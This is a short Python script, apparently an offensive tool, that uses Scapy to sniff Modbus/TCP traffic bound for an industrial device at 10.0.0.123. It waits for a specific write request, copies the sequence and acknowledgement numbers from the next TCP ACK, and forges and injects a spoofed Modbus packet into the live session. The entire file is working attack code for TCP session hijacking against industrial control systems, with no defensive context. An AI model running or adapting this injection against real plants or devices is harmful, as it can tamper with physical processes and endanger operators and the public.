from scapy.all import *
from scapy.layers.inet import *

from packet import Modbus, ModbusTCP

dst_ip = "10.0.0.123"                                       #ip target
modbus_string = "x00\\x00\\x00\\x06\\x02\\x06\\x00\\x14"

while 1:

    ied_write_request = 0
    while not ied_write_request:
        pkts = sniff(iface="eth1", count=5)

        try: 
            output = [index for index, packet in enumerate(pkts) if packet[IP].dst==dst_ip and modbus_string in str(packet[Raw].load)]
        except:
            output = []

        n_packets = len(output)
        if n_packets!=0 and output[n_packets-1]+1<5:
            print("done\n\n")
            ied_write_request = 1
        else: 
            print("retry\n\n")
        
    modbus_response_index = output[len(output)-1]
    modbus_response = pkts[modbus_response_index]

    tcp_ack_index = modbus_response_index+1
    tcp_ack = pkts[tcp_ack_index]

    print("---Modbus Response")
    modbus_response.show()
    print("---TCP ACK")
    tcp_ack.show()

    print("     forging packet")
    tcpdata = {
        'src': tcp_ack[IP].src,
        'dst': tcp_ack[IP].dst,
        'sport': tcp_ack[TCP].sport,
        'dport': tcp_ack[TCP].dport,
        'seq': tcp_ack[TCP].seq,
        'ack': tcp_ack[TCP].ack,
        'wnd': tcp_ack[TCP].window,
    }

    payload = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
                TCP(sport=tcpdata['sport'], dport=tcpdata['dport'],
                flags="PA", window=tcpdata['wnd'], seq=tcpdata['seq'], ack=tcpdata['ack'])

    payload = payload/ModbusTCP()/Modbus()

    print("     injecting packet")
    send(payload, verbose=0, iface="eth1")
    print("     packet injected")
    payload.display()